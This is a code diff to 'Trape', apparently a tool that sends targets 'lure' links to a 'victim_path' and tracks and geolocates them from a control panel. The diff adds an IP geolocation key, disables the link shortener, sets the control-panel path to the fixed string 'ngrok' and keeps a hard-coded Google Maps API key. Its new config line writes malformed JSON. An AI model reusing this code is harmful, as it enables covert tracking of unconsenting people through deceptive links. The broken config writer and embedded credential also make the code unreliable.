@@ -31,7 +31,7 @@ class Trape(object):
 	def __init__(self, stat = 0):
 		self.name_trape = "Trape"
 		self.version = "2.0"
-		self.stats_path = utils.generateToken(7)
+		self.stats_path = "ngrok"
 		self.home_path = utils.generateToken(18)
 		self.logout_path = utils.generateToken(6)
 		self.remove_path = utils.generateToken(14)
@@ -66,6 +66,7 @@ class Trape(object):
 
 			self.ngrok = config_trape['ngrok_token']
 			self.gmaps = config_trape['gmaps_api_key']
+			self.ipinfo = config_trape['ipinfo_api_key']
 			if self.gmaps == '':
 				self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
 			self.googl = config_trape['gshortener_api_key']
@@ -212,11 +213,11 @@ class Trape(object):
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text['end'])
 						utils.Go("\t" + "-------------------")
 						r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)
-						gooGl = json.loads(r._content)
-						if r.status_code == 200:
-							utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Link shortened lure: " + utils.Color['blue'] + gooGl['id']  + utils.Color['white'] + " " + "(share)")
-						else:
-							utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " gooGl " + utils.Color['white'] + gooGl['error']['errors'][0]['reason'])
+						#gooGl = json.loads(r._content)
+						#if r.status_code == 200:
+						#	utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Link shortened lure: " + utils.Color['blue'] + gooGl['id']  + utils.Color['white'] + " " + "(share)")
+						#else:
+						#	utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " gooGl " + utils.Color['white'] + gooGl['error']['errors'][0]['reason'])
 						self.nGrokUrl = ngrokStatus.replace('https', 'http')
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Public lure: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])
@@ -268,11 +269,17 @@ class Trape(object):
 		c_gMapsToken = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your Google Maps Api Key?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 		c_gOoglToken = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 		utils.Go("")
+		utils.Go(utils.Color['whiteBold'] + "IP INFO API" + utils.Color['white'])
+		utils.Go("------")
+		utils.Go("You must register with the " + utils.Color['blueBold'] + "api.ipgeolocation.io" + utils.Color['white'] + ", and get an API for geolocation. \nBy having these data you complete the settings")
+		utils.Go("")
+		c_ipinfo = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your IP Info Api Key?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+		utils.Go("")
 		utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Congratulations! " + utils.Color['greenBold'] + "Successful configuration" + utils.Color['white'] + ", now enjoy Trape!" + utils.Color['white'])
 		utils.Go("")
 		time.sleep(0.4)
 		if (c_nGrokToken != '' and c_gMapsToken != ''):
-			v = '{\n\t"ngrok_token" : "' + c_nGrokToken + '",\n\t"gmaps_api_key" : "' + c_gMapsToken + '",\n\t"gshortener_api_key" : "' + c_gOoglToken + '"\n\t}'
+			v = '{\n\t"ngrok_token" : "' + c_nGrokToken + '",\n\t"gmaps_api_key" : "' + c_gMapsToken + '",\n\t"gshortener_api_key" : "' + c_gOoglToken + '"\n\t"ipinfo_api_key" : "' + c_ipinfo + '",\n}'
 			f = open ('trape.config', 'w')
 			f.write(v)
 			f.close()
